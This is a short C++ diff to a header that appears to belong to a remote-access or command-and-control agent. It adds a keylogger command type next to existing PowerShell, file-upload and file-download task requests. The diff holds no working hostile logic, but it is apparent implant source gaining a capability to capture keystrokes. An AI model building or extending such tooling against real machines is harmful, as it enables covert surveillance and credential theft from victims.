@@ -5,10 +5,12 @@
 #include <cstdint>
 #include <string>
 #include <variant>
+#include <deque>
 
 #include "rapidjson/stringbuffer.h"
 #include "rapidjson/document.h"
 #include "rapidjson/writer.h"
+#include "Command.h"
 
 // Task Codes
 #define NO_CODE 0
@@ -205,6 +207,7 @@ using Request = std::variant<
     TaskRequest<CommandPowershell>,
     TaskRequest<CommandUploadFile>,
     TaskRequest<CommandDownloadFile>,
+    TaskRequest<CommandKeylogger>,
     TaskRequest<bool>>;
 
 using Response = std::variant<
